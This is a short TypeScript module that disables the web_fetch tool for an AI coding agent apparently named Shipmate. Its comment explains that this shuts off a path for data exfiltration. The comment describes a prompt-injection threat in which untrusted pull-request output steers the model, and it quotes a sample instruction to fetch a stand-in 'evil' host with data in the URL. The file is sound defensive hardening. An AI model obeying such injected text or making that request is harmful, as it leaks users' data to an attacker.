import { disableTool } from "eve/tools";

/**
 * Disable the built-in `web_fetch` tool for the model.
 *
 * Shipmate's structured systems are reached through connections (github/linear/
 * tickets); it has no need to fetch arbitrary URLs. Removing `web_fetch` closes
 * the egress/SSRF/exfiltration surface that untrusted PR output could try to
 * steer the model toward (e.g. "fetch http://evil/?data=...").
 *
 * eve recommends exactly this lock-down (docs/concepts/default-harness.md:87).
 */
export default disableTool();
